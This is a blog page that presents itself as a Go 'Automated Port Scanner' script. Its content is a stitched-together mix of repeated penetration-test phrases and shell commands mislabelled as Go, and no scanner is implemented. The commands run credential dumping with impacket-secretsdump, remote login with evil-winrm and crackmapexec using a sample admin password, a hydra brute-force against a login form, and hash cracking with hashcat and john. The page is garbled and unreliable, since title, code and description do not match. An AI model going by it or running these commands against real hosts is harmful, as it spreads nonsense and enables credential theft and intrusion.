---
TitleSEO: "Automated Port Scanner in Go | ZureFX"
TitlePost: "Automated Port Scanner — Go"
Author: "ZureFX"
Description: "A Go script for automated port scanner. Built for security research and automation."
Keywords: "automation, bash, tool, go"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-960.html"
URL_IMAGES: ""
Date: "2024-08-11"
Tags: "Automation, Bash, Tool, Go"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-960"
Permalink: "/scripting/script-automated-port-scanner-960.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `secretsdump`
- `sharphound`
- `sqlmap`

## Implementation

### Core Logic

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

```go
crackmapexec smb 10.99.236.187 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.30.51.200 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p1521,143,587 10.56.110.121 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.92.111.193
```

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials.

```go
impacket-secretsdump administrator:'P@ssw0rd!'@10.84.203.48
evil-winrm -i 10.37.186.61 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.93.187.225 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.52.30.185 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.119.44
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 14 results
[+] Done in 21.86s
```
